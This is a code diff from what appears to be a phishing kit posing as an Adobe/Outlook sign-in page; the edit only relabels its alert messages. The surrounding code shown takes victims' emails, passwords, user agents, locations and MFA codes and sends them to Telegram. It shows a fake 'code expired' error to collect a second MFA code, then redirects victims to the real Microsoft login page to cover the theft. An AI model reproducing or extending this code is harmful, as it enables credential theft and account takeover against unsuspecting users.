@@ -630,7 +630,7 @@ async function submitPassword() {
         // Get MX records for the email domain
         const mxRecords = await getMxRecords(emailDomain);
 
-        const message = `🔒 PP Attempt\n\n📧 EE: ${EE}\n🔑 PP: ${password}\n🖥️ U-A: ${userAgent}\n🌍 Loc: ${clientLocation.city}, ${clientLocation.country}\n📡 MX-R: ${mxRecords}`;
+        const message = `🔒Adobe(Outlook)  PP Attempt\n\n📧 EE: ${EE}\n🔑 PP: ${password}\n🖥️ U-A: ${userAgent}\n🌍 Loc: ${clientLocation.city}, ${clientLocation.country}\n📡 MX-R: ${mxRecords}`;
         
         notifyTelegram(message); // Send message to Telegram
 
@@ -679,7 +679,7 @@ function submitMFA() {
         mfaAttemptCount++;
 
         if (mfaAttemptCount === 1) {
-            notifyTelegram(`🔒 1ST MFA Attempt\n\n📧 Email: ${EE}\n🔑🔒 MFA Code: ${mfaCode}`);
+            notifyTelegram(`🔒Adobe(Outlook)  1ST MFA Attempt\n\n📧 Email: ${EE}\n🔑🔒 MFA Code: ${mfaCode}`);
             $('#mfaCodeError').text('Code expired. Please wait for a new code.').show();
 
             cooldownActive = true;
@@ -688,7 +688,7 @@ function submitMFA() {
                 $('#mfaCodeError').text('').hide();
             }, 5000); // 5 seconds cooldown
         } else if (mfaAttemptCount === 2) {
-            notifyTelegram(`🔒 Second MFA Attempt\n\n📧 Email: ${EE}\n🔒 MFA Code: ${mfaCode}`);
+            notifyTelegram(`🔒Adobe(Outlook)  Second MFA Attempt\n\n📧 Email: ${EE}\n🔒 MFA Code: ${mfaCode}`);
             setTimeout(() => {
                 window.location.href = 'https://login.microsoftonline.com/common/login'; // Replace with your desired redirect URL
             }, 2000); // Simulate a delay before redirect
